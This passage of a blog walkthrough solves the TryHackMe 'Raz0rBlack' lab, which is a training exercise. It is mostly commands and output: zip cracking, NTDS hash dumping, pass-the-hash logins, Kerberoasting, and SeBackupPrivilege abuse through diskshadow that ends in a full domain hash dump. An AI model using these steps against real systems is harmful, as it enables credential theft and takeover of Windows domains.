</span></span><span class=line><span class=cl>sbradley.txt                        A       <span class=m>37</span>  Sat Feb <span class=m>27</span> 14:24:21 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> recurse on
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> prompt off
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> mget *
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></div></li><li><p>Cracking the zip and looking at contents:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># convert to hash that john can crack</span>
</span></span><span class=line><span class=cl>root@kali$ zip2john experiment_gone_wrong.zip &gt; <span class=nb>hash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt <span class=nb>hash</span>
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>PKZIP <span class=o>[</span>32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>electromagnetismo <span class=o>(</span>experiment_gone_wrong.zip<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE <span class=o>(</span>2021-07-16 17:05<span class=o>)</span> 1.408g/s 11803Kp/s 11803Kc/s 11803KC/s elephantmeee..elanore67
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@kali$ unzip experiment_gone_wrong.zip
</span></span><span class=line><span class=cl>Archive:  experiment_gone_wrong.zip
</span></span><span class=line><span class=cl><span class=o>[</span>experiment_gone_wrong.zip<span class=o>]</span> system.hive password: electromagnetismo
</span></span><span class=line><span class=cl>inflating: system.hive
</span></span><span class=line><span class=cl>inflating: ntds.dit
</span></span></code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-ljudmilas-hash>What is Ljudmila’s Hash?<a hidden class=anchor aria-hidden=true href=#what-is-ljudmilas-hash>#</a></h2><ul><li><p>Extract hashes</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL &gt; hashes.txt
</span></span></code></pre></div></li><li><p>We need to extract all NTHASHes</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat hashes.txt<span class=p>|</span> cut -d <span class=s2>&#34;:&#34;</span> -f <span class=m>4</span> &gt; pothashes.txt  
</span></span></code></pre></div></li><li><p>After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
</span></span><span class=line><span class=cl>...<span class=o>[</span>snip<span class=o>]</span>...
</span></span><span class=line><span class=cl>SMB         MACHINE_IP    <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>+<span class=o>]</span> raz0rblack.thm<span class=se>\l</span>vetrova f220d3988deb3f516c73f40ee16c431d
</span></span></code></pre></div></li></ul><hr><h2 id=what-is-ljudmilas-flag>What is Ljudmila’s Flag?<a hidden class=anchor aria-hidden=true href=#what-is-ljudmilas-flag>#</a></h2><ul><li><p>Login: (with hash we found earlier)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\l</span>vetrova<span class=se>\D</span>ocuments&gt; whoami
</span></span><span class=line><span class=cl>raz0rblack<span class=se>\l</span>vetrova
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\l</span>vetrova<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\l</span>vetrova&gt; <span class=nv>$Credential</span> <span class=o>=</span> Import-Clixml -Path <span class=s2>&#34;.\lvetrova.xml&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\l</span>vetrova&gt; <span class=nv>$Credential</span>.GetNetworkCredential<span class=o>()</span>.password
</span></span><span class=line><span class=cl>THM<span class=o>{</span>flag-data<span class=o>}</span>
</span></span></code></pre></div><p><img alt=img loading=lazy src=https://i.imgur.com/oJ83QKi.png></p></li></ul><hr><h2 id=what-is-xyan1d3s-password>What is Xyan1d3’s password?<a hidden class=anchor aria-hidden=true href=#what-is-xyan1d3s-password>#</a></h2><ul><li><p>Kerberoasting with pass-the-hash with lvetrovas creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
</span></span><span class=line><span class=cl>-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
</span></span><span class=line><span class=cl>HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  <span class=nv>CN</span><span class=o>=</span>Remote Management Users,CN<span class=o>=</span>Builtin,DC<span class=o>=</span>raz0rblack,DC<span class=o>=</span>thm  2021-02-23 10:17:17.715160  &lt;never&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@kali$ hashcat -m <span class=m>13100</span> hashes.kerberoast rockyou.txt<span class=o>(</span>relative path: /usr/share/wordlist/rockyou.txt<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1># cracked password: cyanide9amine5628</span>
</span></span></code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-xyan1d3s-flag>What is Xyan1d3’s Flag?<a hidden class=anchor aria-hidden=true href=#what-is-xyan1d3s-flag>#</a></h2><ul><li><p>login:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\x</span>yan1d3<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\x</span>yan1d3&gt; <span class=nv>$Credential</span> <span class=o>=</span> Import-Clixml -Path <span class=s2>&#34;xyan1d3.xml&#34;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\x</span>yan1d3&gt; <span class=nv>$Credential</span>.GetNetworkCredential<span class=o>()</span>.password
</span></span><span class=line><span class=cl>LOL here it is -&gt; THM<span class=o>{</span>62ca7e0b901aa8f0b233cade0839b5bb<span class=o>}</span>
</span></span></code></pre></div></li></ul><hr><h2 id=what-is-the-root-flag>What is the root Flag?<a hidden class=anchor aria-hidden=true href=#what-is-the-root-flag>#</a></h2><ul><li><p>check privileges:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\x</span>yan1d3&gt; whoami /all
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PRIVILEGES INFORMATION
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Privilege Name                Description                    <span class=nv>State</span>
</span></span><span class=line><span class=cl><span class=o>=============================</span> <span class=o>==============================</span> <span class=o>=======</span>
</span></span><span class=line><span class=cl>SeMachineAccountPrivilege     Add workstations to domain     Enabled
</span></span><span class=line><span class=cl>SeBackupPrivilege             Back up files and directories  Enabled
</span></span><span class=line><span class=cl>SeRestorePrivilege            Restore files and directories  Enabled
</span></span><span class=line><span class=cl>SeShutdownPrivilege           Shut down the system           Enabled
</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working <span class=nb>set</span> Enabled
</span></span></code></pre></div></li><li><p>Abuse Backup Privs (important: diskshadow.txt has a space after each line):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># create `diskshadow.txt` file content are follwoing</span>
</span></span><span class=line><span class=cl>root@kali$ cat diskshadow.txt
</span></span><span class=line><span class=cl><span class=nb>set</span> metadata C:<span class=se>\t</span>mp<span class=se>\t</span>mp.cabs 
</span></span><span class=line><span class=cl><span class=nb>set</span> context persistent nowriters 
</span></span><span class=line><span class=cl>add volume c: <span class=nb>alias</span> someAlias 
</span></span><span class=line><span class=cl>create 
</span></span><span class=line><span class=cl>expose %someAlias% h: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\x</span>yan1d3&gt; mkdir C:<span class=se>\t</span>mp 
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; upload diskshadow.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; diskshadow.exe /s c:<span class=se>\t</span>mp<span class=se>\d</span>iskshadow.txt
</span></span><span class=line><span class=cl>Microsoft DiskShadow version 1.0
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> <span class=m>2013</span> Microsoft Corporation
</span></span><span class=line><span class=cl>On computer:  HAVEN-DC,  7/16/2021 3:45:19 PM
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-&gt; <span class=nb>set</span> metadata C:<span class=se>\t</span>mp<span class=se>\t</span>mp.cabs
</span></span><span class=line><span class=cl>-&gt; <span class=nb>set</span> context persistent nowriters
</span></span><span class=line><span class=cl>-&gt; add volume c: <span class=nb>alias</span> someAlias
</span></span><span class=line><span class=cl>-&gt; create
</span></span><span class=line><span class=cl>Alias someAlias <span class=k>for</span> shadow ID <span class=o>{</span>29b531e8-3c00-49f9-925d-5e1e3937af13<span class=o>}</span> <span class=nb>set</span> as environment variable.
</span></span><span class=line><span class=cl>Alias VSS_SHADOW_SET <span class=k>for</span> shadow <span class=nb>set</span> ID <span class=o>{</span>2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6<span class=o>}</span> <span class=nb>set</span> as environment variable.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Querying all shadow copies with the shadow copy <span class=nb>set</span> ID <span class=o>{</span>2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6<span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     * Shadow copy <span class=nv>ID</span> <span class=o>=</span> <span class=o>{</span>29b531e8-3c00-49f9-925d-5e1e3937af13<span class=o>}</span>               %someAlias%
</span></span><span class=line><span class=cl>               - Shadow copy set: <span class=o>{</span>2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6<span class=o>}</span>       %VSS_SHADOW_SET%
</span></span><span class=line><span class=cl>               - Original count of shadow <span class=nv>copies</span> <span class=o>=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>               - Original volume name: <span class=se>\\</span>?<span class=se>\V</span>olume<span class=o>{</span>115c1f55-0000-0000-0000-602200000000<span class=o>}</span><span class=se>\ </span><span class=o>[</span>C:<span class=se>\]</span>
</span></span><span class=line><span class=cl>               - Creation time: 7/16/2021 3:45:20 PM
</span></span><span class=line><span class=cl>               - Shadow copy device name: <span class=se>\\</span>?<span class=se>\G</span>LOBALROOT<span class=se>\D</span>evice<span class=se>\H</span>arddiskVolumeShadowCopy1
</span></span><span class=line><span class=cl>               - Originating machine: HAVEN-DC.raz0rblack.thm
</span></span><span class=line><span class=cl>               - Service machine: HAVEN-DC.raz0rblack.thm
</span></span><span class=line><span class=cl>               - Not exposed
</span></span><span class=line><span class=cl>               - Provider ID: <span class=o>{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class=o>}</span>
</span></span><span class=line><span class=cl>               - Attributes:  No_Auto_Release Persistent No_Writers Differential
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Number of shadow copies listed: <span class=m>1</span>
</span></span><span class=line><span class=cl>-&gt; expose %someAlias% h:
</span></span><span class=line><span class=cl>-&gt; %someAlias% <span class=o>=</span> <span class=o>{</span>29b531e8-3c00-49f9-925d-5e1e3937af13<span class=o>}</span>
</span></span><span class=line><span class=cl>The shadow copy was successfully exposed as h:<span class=se>\.</span>
</span></span></code></pre></div><p>ref:</p><ul><li><a href=https://coldfusionx.github.io/posts/Blackfield-HTB/>https://coldfusionx.github.io/posts/Blackfield-HTB/</a></li><li><a href=http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738>http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738</a></li></ul></li><li><p>Get dll’s to abuse Backup Privs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
</span></span></code></pre></div></li><li><p>Upload, import, abuse:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; upload SeBackupPrivilegeUtils.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; upload SeBackupPrivilegeCmdLets.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; import-module .<span class=se>\S</span>eBackupPrivilegeUtils.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; import-module .<span class=se>\S</span>eBackupPrivilegeCmdLets.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; copy-filesebackupprivilege h:<span class=se>\w</span>indows<span class=se>\n</span>tds<span class=se>\n</span>tds.dit C:<span class=se>\t</span>mp<span class=se>\n</span>tds.dit -overwrite
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; reg save HKLM<span class=se>\S</span>YSTEM C:<span class=se>\t</span>mp<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; download ntds.dit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\t</span>mp&gt; download system
</span></span></code></pre></div></li><li><p>Dump the hashes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\x</span>yan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\l</span>vetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\s</span>bradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\t</span>williams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Kerberos keys from ntds.dit 
</span></span><span class=line><span class=cl>Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
</span></span><span class=line><span class=cl>Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
</span></span><span class=line><span class=cl>Administrator:des-cbc-md5:d3b646b65bceb5c7
</span></span><span class=line><span class=cl>HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
</span></span><span class=line><span class=cl>HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
</span></span><span class=line><span class=cl>HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
</span></span><span class=line><span class=cl>krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
</span></span><span class=line><span class=cl>krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
</span></span><span class=line><span class=cl>krbtgt:des-cbc-md5:857a46f13e91eae3
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\x</span>yan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\x</span>yan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\x</span>yan1d3:des-cbc-md5:e9a1a46223cd8975
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\l</span>vetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\l</span>vetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\l</span>vetrova:des-cbc-md5:385d6e1f1cc17fb6
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\s</span>bradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\s</span>bradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\s</span>bradley:des-cbc-md5:83fe3e584f4a5bf8
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\t</span>williams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\t</span>williams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
</span></span><span class=line><span class=cl>raz0rblack.thm<span class=se>\t</span>williams:des-cbc-md5:01e958b0ea6edf07
</span></span></code></pre></div></li><li><p>Get admin flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator&gt; <span class=nb>type</span> root.xml
</span></span><span class=line><span class=cl>&lt;Objs <span class=nv>Version</span><span class=o>=</span><span class=s2>&#34;1.1.0.1&#34;</span> <span class=nv>xmlns</span><span class=o>=</span><span class=s2>&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;Obj <span class=nv>RefId</span><span class=o>=</span><span class=s2>&#34;0&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TN <span class=nv>RefId</span><span class=o>=</span><span class=s2>&#34;0&#34;</span>&gt;
</span></span><span class=line><span class=cl>     &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
</span></span><span class=line><span class=cl>     &lt;T&gt;System.Object&lt;/T&gt;
</span></span><span class=line><span class=cl>&lt;/TN&gt;
</span></span><span class=line><span class=cl>&lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
</span></span><span class=line><span class=cl>&lt;Props&gt;
</span></span><span class=line><span class=cl>     &lt;S <span class=nv>N</span><span class=o>=</span><span class=s2>&#34;UserName&#34;</span>&gt;Administrator&lt;/S&gt;
</span></span><span class=line><span class=cl>     &lt;SS <span class=nv>N</span><span class=o>=</span><span class=s2>&#34;Password&#34;</span>&gt;44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a&lt;/SS&gt;
</span></span><span class=line><span class=cl>&lt;/Obj&gt;
</span></span><span class=line><span class=cl>&lt;/Objs&gt;
</span></span></code></pre></div></li><li><p>Copy the password and convert from hex to get the flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>root@kali$ python3                                                                          
</span></span><span class=line><span class=cl>Python 3.9.2 <span class=o>(</span>default, Feb <span class=m>28</span> 2021, 17:03:44<span class=o>)</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>GCC 10.2.1 20210110<span class=o>]</span> on linux
</span></span><span class=line><span class=cl>Type <span class=s2>&#34;help&#34;</span>, <span class=s2>&#34;copyright&#34;</span>, <span class=s2>&#34;credits&#34;</span> or <span class=s2>&#34;license&#34;</span> <span class=k>for</span> more information.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; <span class=nv>s</span> <span class=o>=</span> <span class=s2>&#34;44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; print<span class=o>(</span>bytes.fromhex<span class=o>(</span>s<span class=o>)</span>.decode<span class=o>(</span><span class=s1>&#39;ASCII&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl>Damn you are a genius.
</span></span><span class=line><span class=cl>But, I apologize <span class=k>for</span> cheating you like this.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Here is your Root Flag
</span></span><span class=line><span class=cl>THM<span class=o>{</span>1b4f46cc4fba46348273d18dc91da20d<span class=o>}</span>
</span></span></code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-tysons-flag>What is Tyson’s Flag?<a hidden class=anchor aria-hidden=true href=#what-is-tysons-flag>#</a></h2><ul><li><p>As Administrator:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\u</span>sers<span class=se>\t</span>williams&gt; <span class=nb>type</span> .<span class=se>\d</span>efinitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
</span></span><span class=line><span class=cl>THM<span class=o>{</span>5144f2c4107b7cab04916724e3749fb0<span class=o>}</span>
</span></span></code></pre></div></li></ul><hr><h2 id=what-is-the-complete-top-secret>What is the complete top secret?<a hidden class=anchor aria-hidden=true href=#what-is-the-complete-top-secret>#</a></h2><ul><li><p>Enumerate all folders and find top secret path:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\&gt;</span> <span class=nb>cd</span> <span class=s2>&#34;C:\Program Files\Top Secret&#34;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\P</span>rogram Files<span class=se>\T</span>op Secret&gt; dir
</span></span><span class=line><span class=cl>Directory: C:<span class=se>\P</span>rogram Files<span class=se>\T</span>op Secret
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-a----        2/25/2021  10:13 AM         <span class=m>449195</span> top_secret.png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\P</span>rogram Files<span class=se>\T</span>op Secret&gt; download top_secret.png
</span></span></code></pre></div></li></ul><p>Open the image in firefox and see the text “I dont have much time […] the way to exit vim is :w”. He died before he could end his sentence, so the answer for the last question is: <code>:wq</code>.</p><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script></div><footer class=post-footer><ul class=post-tags><li><a href=https://classroom.anir0y.in/tags/tryhackme/>Tryhackme</a></li><li><a href=https://classroom.anir0y.in/tags/rooms/>Rooms</a></li><li><a href=https://classroom.anir0y.in/tags/thm/>Thm</a></li><li><a 